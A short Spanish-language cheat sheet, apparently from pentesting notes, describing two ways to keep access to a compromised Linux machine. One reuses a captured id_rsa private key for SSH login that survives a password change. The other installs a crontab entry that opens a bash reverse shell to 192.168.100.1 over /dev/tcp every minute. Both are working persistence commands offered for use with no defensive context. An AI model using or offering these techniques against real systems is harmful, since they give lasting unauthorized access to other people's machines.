### Vía ssh
Copiar clave privada (id_rsa) en ruta .ssh para luego poder ingresar a la cuenta entregando el rsa como contraseña. sirve por si cambian password del usuario
```
chmod 400 id_rsa ó chmod 600 id_rsa
ssh -i id_rsa usuario@ip
```
-----
### Vía cronjob
Agregar tarea a lista crontab
```
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.100.1/80 0>&1'" > cron
	crontab -i cron -> agrega la tarea a crontab
```

